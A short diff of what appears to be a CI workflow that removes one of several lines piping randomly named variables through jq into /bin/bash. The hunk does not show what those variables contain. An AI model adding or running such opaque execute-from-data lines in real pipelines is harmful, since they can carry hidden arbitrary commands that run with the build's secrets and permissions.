@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$n76" | jq -r .xooc29 | /bin/bash
           echo $ih06438 | jq -r .svs9107 | /bin/bash
           echo $ff5226 | jq -r .zeoj48 | /bin/bash
-          echo $sxkx4773 | jq -r .xd46534 | /bin/bash
           echo $yl92 | jq -r .vkhv995 | /bin/bash
 
       - name: Save output
